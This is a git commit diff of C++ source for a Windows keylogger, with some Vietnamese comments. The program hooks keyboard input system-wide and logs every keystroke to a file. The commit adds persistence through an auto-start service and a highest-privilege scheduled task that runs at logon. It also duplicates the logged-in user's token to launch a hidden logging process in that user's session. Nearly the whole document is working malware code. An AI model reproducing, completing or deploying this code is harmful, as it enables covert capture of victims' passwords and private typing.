af216274c927b28b558310144f4fa5f3977ffc2c
anhshidou <ranin.fox.87@gmail.com>
2025-06-03 02:38:23 +0700

    tesst

--- KeyloggerTest/KeyloggerTest/KeyloggerTest.cpp
+++ KeyloggerTest/KeyloggerTest/KeyloggerTest.cpp
@@ -2,35 +2,43 @@
 #include <shlobj.h>
 #include <fstream>
 #include <string>
-#include <iostream>
+#include <userenv.h>
+#include <Wtsapi32.h>
+#pragma comment(lib, "Wtsapi32.lib")
+#pragma comment(lib, "userenv.lib") 
 
-
-using namespace std;
-
-// ===CONFIG===
 #define SERVICE_NAME L"Keylogger"
 SERVICE_STATUS_HANDLE g_ServiceStatusHandle = NULL;
 HANDLE g_ServiceStopEvent = NULL;
 
-// Desktop Path file log
-string DesktopPath() {
+// Lấy path file exe hiện tại (dùng short path name)
+std::wstring getExePath() {
+    wchar_t exePath[MAX_PATH];
+    GetModuleFileNameW(NULL, exePath, MAX_PATH);
+    wchar_t shortPath[MAX_PATH];
+    if (GetShortPathNameW(exePath, shortPath, MAX_PATH) == 0) {
+        return exePath;
+    }
+    return shortPath;
+}
+
+std::string DesktopPath() {
     char* home = nullptr;
     size_t len = 0;
     errno_t err = _dupenv_s(&home, &len, "USERPROFILE");
     if (err == 0 && home != nullptr) {
-        string desktopPath = string(home) + "\\Desktop\\keylog.txt";
+        std::string desktopPath = std::string(home) + "\\Desktop\\keylog.txt";
         free(home);
         return desktopPath;
     }
     else {
-        return "keylog.txt"; // fallback if USERPROFILE is not set
-
+        return "keylog.txt";
     }
 }
 
-// Log key
+// ----------- KEYLOGGER -----------
 void LogKeyStroke(int key) {
-    string keyStr;
+    std::string keyStr;
     if (key == VK_BACK) keyStr = "[BACKSPACE]";
     else if (key == VK_RETURN) keyStr = "[ENTER]\n";
     else if (key == VK_TAB) keyStr = "[TAB]";
@@ -40,13 +48,10 @@ void LogKeyStroke(int key) {
     else if (key == VK_SPACE) keyStr = " ";
     else if ((key >= 'A' && key <= 'Z') || (key >= 'a' && key <= 'z') || (key >= '0' && key <= '9'))
         keyStr = (char)key;
-    else keyStr = "[ " + to_string(key) + " ]";
-
-    // Log key ra file
-    ofstream logFile(DesktopPath(), ios::app);
+    else keyStr = "[ " + std::to_string(key) + " ]";
+    std::ofstream logFile(DesktopPath(), std::ios::app);
     logFile << keyStr;
     logFile.close();
-
 }
 
 LRESULT CALLBACK KeyBoardProcess(int nCode, WPARAM wParam, LPARAM lParam) {
@@ -59,13 +64,64 @@ LRESULT CALLBACK KeyBoardProcess(int nCode, WPARAM wParam, LPARAM lParam) {
 }
 
 void KeyLoggerMain() {
-    HHOOK KeyBoardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardProcess, NULL, 0);
+    HHOOK KeyBoardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyBoardProcess, GetModuleHandle(NULL), 0);
     MSG msg;
-    while (WaitForSingleObject(g_ServiceStopEvent, 0) != WAIT_OBJECT_0 && GetMessage(&msg, NULL, 0, 0)) {
+    while (GetMessage(&msg, NULL, 0, 0)) {
         TranslateMessage(&msg);
-        DispatchMessageW(&msg);
+        DispatchMessage(&msg);
     }
     UnhookWindowsHookEx(KeyBoardHook);
+}
+
+// ----------- SCHEDULED TASK -----------
+void CreateKeyloggerTask() {
+    std::wstring exePath = getExePath();
+    std::string path(exePath.begin(), exePath.end());
+    std::string taskName = "KeyloggerTask";
+    std::string cmd = "schtasks /Create /SC ONLOGON /RL HIGHEST /TN \"" + taskName + "\" /TR \"\\\"" + path + "\\\" /keylogger\" /F /IT";
+    system(cmd.c_str());
+}
+
+// ----------- SERVICE CONTROL -----------
+bool IsServiceInstalled() {
+    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
+    if (hSCM) {
+        SC_HANDLE hService = OpenService(hSCM, SERVICE_NAME, SERVICE_QUERY_STATUS);
+        if (hService) {
+            CloseServiceHandle(hService);
+            CloseServiceHandle(hSCM);
+            return true;
+        }
+        CloseServiceHandle(hSCM);
+    }
+    return false;
+}
+
+void InstallService(const wchar_t* exePath) {
+    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
+    if (hSCM) {
+        SC_HANDLE hService = CreateService(
+            hSCM, SERVICE_NAME, SERVICE_NAME, SERVICE_ALL_ACCESS,
+            SERVICE_WIN32_OWN_PROCESS, SERVICE_AUTO_START, SERVICE_ERROR_NORMAL,
+            exePath, NULL, NULL, NULL, NULL, NULL
+        );
+        if (hService) {
+            CloseServiceHandle(hService);
+        }
+        CloseServiceHandle(hSCM);
+    }
+}
+
+void StartServiceFunc() {
+    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CONNECT);
+    if (hSCM) {
+        SC_HANDLE hService = OpenService(hSCM, SERVICE_NAME, SERVICE_START);
+        if (hService) {
+            StartService(hService, 0, NULL);
+            CloseServiceHandle(hService);
+        }
+        CloseServiceHandle(hSCM);
+    }
 }
 
 void WINAPI ServiceCtrlHandler(DWORD ctrlCode) {
@@ -84,11 +140,49 @@ void WINAPI ServiceCtrlHandler(DWORD ctrlCode) {
         break;
     }
 }
-// Main Entry point cua service
+
+// ----------- SPAWN KEYLOGGER AS USER -----------
+void RunKeyloggerAsUser() {
+    DWORD sessionId = WTSGetActiveConsoleSessionId();
+    HANDLE hUserToken = NULL, hPrimaryToken = NULL;
+    if (WTSQueryUserToken(sessionId, &hUserToken)) {
+        // Duplicate sang Primary Token!
+        if (DuplicateTokenEx(
+            hUserToken,
+            TOKEN_ALL_ACCESS, NULL, SecurityImpersonation,
+            TokenPrimary, &hPrimaryToken))
+        {
+            LPVOID env = NULL;
+            if (CreateEnvironmentBlock(&env, hPrimaryToken, FALSE)) {
+                std::wstring exePath = getExePath();
+                std::wstring cmdLine = L"\"" + exePath + L"\" /keylogger";
+                STARTUPINFOW si = { 0 };
+                si.cb = sizeof(si);
+                si.lpDesktop = (LPWSTR)L"winsta0\\default";
+                si.dwFlags = STARTF_USESHOWWINDOW;
+                si.wShowWindow = SW_HIDE;
+                PROCESS_INFORMATION pi = { 0 };
+                BOOL bRes = CreateProcessAsUserW(
+                    hPrimaryToken, NULL, (LPWSTR)cmdLine.c_str(),
+                    NULL, NULL, FALSE, CREATE_UNICODE_ENVIRONMENT | CREATE_NO_WINDOW,
+                    env, NULL, &si, &pi
+                );
+                if (bRes) {
+                    CloseHandle(pi.hProcess);
+                    CloseHandle(pi.hThread);
+                }
+                DestroyEnvironmentBlock(env);
+            }
+            CloseHandle(hPrimaryToken);
+        }
+        CloseHandle(hUserToken);
+    }
+}
+
+// ----------- SERVICE MAIN -----------
 void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
     SERVICE_STATUS status = { 0 };
     g_ServiceStatusHandle = RegisterServiceCtrlHandler(SERVICE_NAME, ServiceCtrlHandler);
-
     status.dwServiceType = SERVICE_WIN32_OWN_PROCESS;
     status.dwControlsAccepted = SERVICE_ACCEPT_STOP | SERVICE_ACCEPT_SHUTDOWN;
     status.dwCurrentState = SERVICE_START_PENDING;
@@ -96,65 +190,52 @@ void WINAPI ServiceMain(DWORD argc, LPWSTR* argv) {
 
     g_ServiceStopEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
 
-    if(!g_ServiceStopEvent) {
-        status.dwCurrentState = SERVICE_STOPPED;
-        SetServiceStatus(g_ServiceStatusHandle, &status);
-        return;
-	}
+    status.dwCurrentState = SERVICE_RUNNING;
+    SetServiceStatus(g_ServiceStatusHandle, &status);
 
-	status.dwCurrentState = SERVICE_RUNNING;
-	SetServiceStatus(g_ServiceStatusHandle, &status);
+    // Persistence
+    CreateKeyloggerTask();
+    RunKeyloggerAsUser();
 
-    KeyLoggerMain();
-
+    WaitForSingleObject(g_ServiceStopEvent, INFINITE);
     status.dwCurrentState = SERVICE_STOPPED;
     SetServiceStatus(g_ServiceStatusHandle, &status);
 }
 
-// Tu cai dat chuong trinh thanh service
-void InstallService(const wchar_t* exePath) {
-    SC_HANDLE hSCM = OpenSCManager(NULL, NULL, SC_MANAGER_CREATE_SERVICE);
-    if (hSCM) {
-        SC_HANDLE hService = CreateService(
-            hSCM,
-            SERVICE_NAME,
-            SERVICE_NAME,
-            SERVICE_ALL_ACCESS,
-            SERVICE_WIN32_OWN_PROCESS,
-            SERVICE_AUTO_START,
-            SERVICE_ERROR_NORMAL,
-            exePath,
-            NULL,
-            NULL,
-            NULL,
-            NULL,
-            NULL
+// ----------- ENTRY POINT -----------
+int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) {
+    int argc;
+    LPWSTR* argv = CommandLineToArgvW(GetCommandLineW(), &argc);
 
-        );
-        if (hService) {
-            CloseServiceHandle(hService);
-        }
-        CloseServiceHandle(hSCM);
-
-    }
-
-}
-
-int wmain(int argc, wchar_t* argv[]) {
-    if (argc == 1) {
-        wchar_t exePath[MAX_PATH];
-        GetModuleFileNameW(NULL, exePath, MAX_PATH);
-        InstallService(exePath);
-        wcout << "Service Installed" << endl;
+    // Nếu được gọi với /keylogger: chỉ chạy keylogger usermode
+    if (argc >= 2 && wcscmp(argv[1], L"/keylogger") == 0) {
+        KeyLoggerMain();
         return 0;
     }
 
-    SERVICE_TABLE_ENTRY ServiceTable[] = {
-        {(LPWSTR)SERVICE_NAME, ServiceMain},
-        {NULL, NULL}
-    };
-    StartServiceCtrlDispatcher(ServiceTable);
+    // Nếu được gọi bởi SCM: vào service main
+    if (argc >= 2 && wcscmp(argv[1], L"/service") == 0) {
+        SERVICE_TABLE_ENTRY ServiceTable[] = {
+            {(LPWSTR)SERVICE_NAME, ServiceMain},
+            {NULL, NULL}
+        };
+        StartServiceCtrlDispatcher(ServiceTable);
+        return 0;
+    }
+
+    // Nếu chạy lần đầu (double click...), sẽ tự cài service nếu chưa có rồi chạy service
+    if (!IsServiceInstalled()) {
+        std::wstring exePath = getExePath();
+        InstallService(exePath.c_str());
+        StartServiceFunc();
+    }
+    else {
+        // Start service main nếu không có đối số nào (tức là được double-click, task scheduler, v.v.)
+        SERVICE_TABLE_ENTRY ServiceTable[] = {
+            {(LPWSTR)SERVICE_NAME, ServiceMain},
+            {NULL, NULL}
+        };
+        StartServiceCtrlDispatcher(ServiceTable);
+    }
     return 0;
-
 }
-
